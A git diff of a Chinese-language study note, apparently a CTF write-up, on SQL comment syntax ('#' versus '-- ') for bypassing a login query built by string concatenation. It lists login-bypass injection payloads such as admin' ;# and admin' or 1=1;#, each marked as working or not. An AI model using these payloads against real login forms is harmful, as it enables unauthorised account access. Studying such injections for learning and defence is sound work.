@@ -12,8 +12,9 @@ tags:
 `#`是php和sql中的注释，而`--`仅是sql语言中的注释,`--`在使用时后面必须有一个空格
 原题代码为`$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";`
 ```
-admin' and username='admin';#       可以
-admin' and username='admin'#        不可以 ,结尾没有`;`，语句错误
+admin' ;#                           可以
+admin' #                            不可以 ,结尾没有`;`，语句错误
+admin' or 1=1;#                     不可以，此时没有以admin身份登录
 
 Admin' -- yes i can                 可以
 Admin' --yes i can                  不可以，--后面没有空格
